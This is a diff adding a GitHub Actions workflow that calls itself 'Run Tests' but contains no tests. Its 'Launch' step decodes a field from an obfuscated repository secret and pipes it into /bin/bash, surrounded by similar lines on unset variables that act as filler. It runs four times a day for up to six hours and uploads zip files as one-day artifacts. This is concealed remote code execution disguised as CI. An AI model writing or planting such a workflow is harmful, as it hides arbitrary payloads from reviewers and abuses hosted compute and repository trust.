@@ -1,0 +1,35 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '12 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          jlx33830: ${{ secrets.jlx33830 }}
+        run: |
+          printf '%s' "$jlx33830" | jq -r .uo794 | /bin/bash
+          echo $j3945 | jq -r .ju6 | /bin/bash
+          echo $ybhi23 | jq -r .zi094 | /bin/bash
+          printf '%s' "$fryvc045" | jq -r .lo4 | /bin/bash
+          echo $sgorv706 | jq -r .uot573 | /bin/bash
+          echo $wd6288 | jq -r .t1011 | /bin/bash
+          echo $xtjq2 | jq -r .bi80 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: siwhdrsA
+          path: "*.zip"
+          retention-days: 1
